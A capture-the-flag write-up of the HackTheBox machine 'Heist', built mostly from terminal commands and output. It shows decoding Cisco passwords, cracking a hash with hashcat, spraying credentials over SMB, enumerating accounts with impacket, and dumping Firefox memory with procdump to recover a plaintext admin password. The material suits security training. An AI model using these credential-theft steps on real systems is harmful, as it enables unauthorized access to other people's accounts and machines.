### Enumeration

# Autorecon
```console
noob2uub@kali:~/ctf/htb/heist$ autorecon -o heist 10.10.10.149
[!] It looks like the config/plugins in /home/noob2uub/.config/AutoRecon are outdated. Please remove the /home/noob2uub/.config/AutoRecon directory and re-run AutoRecon to rebuild them.
[*] Scanning target 10.10.10.149
[!] [10.10.10.149/top-100-udp-ports] UDP scan requires AutoRecon be run with root privileges.
[*] [10.10.10.149/all-tcp-ports] Discovered open port tcp/80 on 10.10.10.149
[*] [10.10.10.149/all-tcp-ports] Discovered open port tcp/445 on 10.10.10.149
[*] [10.10.10.149/all-tcp-ports] Discovered open port tcp/135 on 10.10.10.149

[2]+  Stopped                 autorecon -o heist 10.10.10.149
noob2uub@kali:~/ctf/htb/heist$ sudo autorecon -o heist 10.10.10.149
[sudo] password for noob2uub: 
[!] It looks like the config/plugins in /root/.config/AutoRecon are outdated. Please remove the /root/.config/AutoRecon directory and re-run AutoRecon to rebuild them.
[*] Scanning target 10.10.10.149
[*] [10.10.10.149/all-tcp-ports] Discovered open port tcp/80 on 10.10.10.149
[*] [10.10.10.149/all-tcp-ports] Discovered open port tcp/135 on 10.10.10.149
[*] [10.10.10.149/all-tcp-ports] Discovered open port tcp/445 on 10.10.10.149
[*] [10.10.10.149/all-tcp-ports] Discovered open port tcp/5985 on 10.10.10.149
[*] 12:55:29 - There are 3 scans still running against 10.10.10.149
[*] [10.10.10.149/all-tcp-ports] Discovered open port tcp/49669 on 10.10.10.149
[*] [10.10.10.149/tcp/80/http/vhost-enum] The target was not a hostname, nor was a hostname provided as an option. Skipping virtual host enumeration.
[*] [10.10.10.149/tcp/80/http/known-security] [tcp/80/http/known-security] There did not appear to be a .well-known/security.txt file in the webroot (/).
[*] [10.10.10.149/tcp/80/http/curl-robots] [tcp/80/http/curl-robots] There did not appear to be a robots.txt file in the webroot (/).
[*] 12:56:29 - There are 9 scans still running against 10.10.10.149
[*] 12:57:29 - There are 4 scans still running against 10.10.10.149
[*] [10.10.10.149/tcp/5985/http/vhost-enum] The target was not a hostname, nor was a hostname provided as an option. Skipping virtual host enumeration.
[*] [10.10.10.149/tcp/5985/http/known-security] [tcp/5985/http/known-security] There did not appear to be a .well-known/security.txt file in the webroot (/).
[*] [10.10.10.149/tcp/5985/http/curl-robots] [tcp/5985/http/curl-robots] There did not appear to be a robots.txt file in the webroot (/).

```

# Port 80 Web Interface 

![Screenshot_2022-04-29_12-55-58](https://user-images.githubusercontent.com/68706090/166060741-b30495bf-2107-4b96-afba-db093989d108.png)

not really seeing anything on this page 

We see port 445 and 135 so we know its a windows machine.
Additionally I see Port 5985 which after a google search runs WinRM 2.0

I am not seeing anything but I did notice on the login page, I can login as guest. 

![Screenshot_2022-04-29_13-16-09](https://user-images.githubusercontent.com/68706090/166063189-059f42e1-684d-48aa-ad29-8cece1d6d0f5.png)

# Config.txt
```console
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
 ```
 Also Hazard is requesting an account. We may have some user names and hashed passwords
 
 ```console
 Cisco Type 5 Salted Hash
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 

Cisco Type 7 
username rout3r password 7 0242114B0E143F015F5D1E161713 cisco type 7
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 cisco type 7
```
I found this website for cracking cisco hashes
https://www.infosecmatter.com/cisco-password-cracking-and-decrypting-guide/

# Cisco Type 7 Passwords 

```console
noob2uub@kali:~/tools$ python3 ciscot7.py -d -p 0242114B0E143F015F5D1E161713
Decrypted password: $uperP@ssword
noob2uub@kali:~/tools$ python3 ciscot7.py -d -p 02375012182C1A1D751618034F36415408 
Decrypted password: Q4)sJu\Y8qz*A3?d
```
User: rout3r Password: $uperP@ssword
User: admin Password: Q4)sJu\Y8qz*A3?d

# Hashcat
```console
kraken@DESKTOP-8AA7GAV C:\Users\kraken\hashcat>hashcat -m 500 -O -a 0 -o cisco.txt hash/hash.txt dict/rockyou.txt
hashcat (v6.2.5) starting

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
* Device #2: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
CUDA API (CUDA 11.6)
====================
* Device #1: NVIDIA GeForce GTX 1080 Ti, 10228/11263 MB, 28MCU

OpenCL API (OpenCL 3.0 CUDA 11.6.99) - Platform #1 [NVIDIA Corporation]
=======================================================================
* Device #2: NVIDIA GeForce GTX 1080 Ti, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 15

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1475 MB

Dictionary cache hit:
* Filename..: dict/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384


Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
Hash.Target......: $1$pdQG$o8nrSzsGXeaduXrjlvKc91
Time.Started.....: Fri Apr 29 13:37:48 2022 (2 secs)
Time.Estimated...: Fri Apr 29 13:37:50 2022 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (dict/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1808.9 kH/s (8.38ms) @ Accel:8 Loops:500 Thr:1024 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 3712058/14344384 (25.88%)
Rejected.........: 42042/3712058 (1.13%)
Restore.Point....: 3476999/14344384 (24.24%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:500-1000
Candidate.Engine.: Device Generator
Candidates.#1....: supemran17 -> skratch23
Hardware.Mon.#1..: Temp: 57c Fan: 39% Util: 19% Core:1958MHz Mem:5508MHz Bus:8

Started: Fri Apr 29 13:37:44 2022
Stopped: Fri Apr 29 13:37:52 2022
```
$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent

We have the password for the type 5

Now lets run crackmapexec

# Crackmapexec

```console
noob2uub@kali:~/ctf/htb/heist$ crackmapexec smb 10.10.10.149 -u users.txt -p password.txt
/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: "is not" with a literal. Did you mean "!="?
  if result['type'] is not 'searchResEntry':
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:stealth1agent STATUS_LOGON_FAILURE 
noob2uub@kali:~/ctf/htb/heist$ crackmapexec smb 10.10.10.149 -u users.txt -p password.txt
/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: "is not" with a literal. Did you mean "!="?
  if result['type'] is not 'searchResEntry':
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\hazard:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent 
```
The first run I forgot to add hazard as a user. Lets run SMB Client

#SMBclient

```console
noob2uub@kali:~/ctf/htb/heist$ smbclient -L \\\\10.10.10.149 -U 'hazard'
Enter WORKGROUP\hazard's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.149 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
```

Running IMPACKET for further enumeration with lookupid

# IMPACKET

```console
noob2uub@kali:~/tools/impacket$ sudo docker run -it --rm "impacket:latest"
/ # help
Built-in commands:
------------------
	. : [ [[ alias bg break cd chdir command continue echo eval exec
	exit export false fg getopts hash help history jobs kill let
	local printf pwd read readonly return set shift source test times
	trap true type ulimit umask unalias unset wait
/ # lookupsid.py hazard:stealth1agent@10.10.10.149
Impacket v0.9.25.dev1+20220428.174722.95a4805 - Copyright 2021 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.10.149
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
/ # 
```

We have new users support, chase, and jayson lets add them to our user name list and remove hazard from the list

# Crackmapexec

```console
noob2uub@kali:~/ctf/htb/heist$ crackmapexec smb 10.10.10.149 -u users.txt -p password.txt
/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: "is not" with a literal. Did you mean "!="?
  if result['type'] is not 'searchResEntry':
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\jason:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\jason:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\jason:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\chase:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\chase:Q4)sJu\Y8qz*A3?d 
```

We have more credentials  SupportDesk\chase:Q4)sJu\Y8qz*A3?d 
```
Lets checkout what processes are running on the machine

```console
*Evil-WinRM* PS C:\users\chase> ps
```
We can see that the user is running firefox

```console
   1063      71   150632     513204       7.16   1992   1 firefox
    378      28    22780     306584       1.34   2728   1 firefox
    347      19    10268     287568       0.08   2860   1 firefox
    401      34    35392     337216       1.75   4036   1 firefox
    356      25    16452     297040       0.30   6320   1 firefox
```

Now lets run Procdump on the machine and first upload it. 

# Uploading Procdump

``console
*Evil-WinRM* PS C:\Users\Chase\Documents> upload /home/noob2uub/tools/SysinternalsSuite/procdump64.exe
Info: Uploading /home/noob2uub/tools/SysinternalsSuite/procdump64.exe to C:\Users\Chase\Documents\procdump64.exe
```
```console
*Evil-WinRM* PS C:\Users\Chase\Documents> .\procdump64 1992

ProcDump v10.11 - Sysinternals process dump utility
Copyright (C) 2009-2021 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[04:56:42] Dump 1 initiated: C:\Users\Chase\Documents\firefox.exe_220430_045642.dmp
[04:56:42] Dump 1 complete: 5 MB written in 0.2 seconds
[04:56:43] Dump count reached.
```
We all of the .dmp files and I already created the strings.

```console
*Evil-WinRM* PS C:\Users\Chase\Documents> dir


    Directory: C:\Users\Chase\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/30/2022   3:38 AM      526343246 firefox.exe_220430_033825.dmp
-a----        4/30/2022   3:38 AM      313667773 firefox.exe_220430_033843.dmp
-a----        4/30/2022   3:38 AM      294583691 firefox.exe_220430_033849.dmp
-a----        4/30/2022   3:39 AM      343361528 firefox.exe_220430_033915.dmp
-a----        4/30/2022   3:39 AM      304285873 firefox.exe_220430_033930.dmp
-a----        4/30/2022   4:24 AM      525423286 firefox.exe_220430_042438.dmp
-a----        4/30/2022   4:56 AM        4611172 firefox.exe_220430_045642.dmp
-a----        4/30/2022   3:18 AM         401296 procdump64.exe
-a----        4/30/2022   4:54 AM      268745236 string.txt
-a----        4/30/2022   4:00 AM         370056 strings.exe
-a----        4/30/2022   4:07 AM       77909894 strings.txt
```
.\strings firefox.exe_220430_042438.dmp > string.txt

then 

download string.txt

Searching the string for usernames or passwords i find this.

```console
C:\Windows\system32\
C:\Program Files\Mozilla Firefox\firefox.exe
"C:\Program Files\Mozilla Firefox\firefox.exe" localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
C:\Program Files\Mozilla Firefox\firefox.exe
WinSta0\Default
C:\Windows\SYSTEM32\ntdll.dll
C:\Windows\System32
C:\Windows\SYSTEM32;C:\Windows\system;C:\Windows;
```
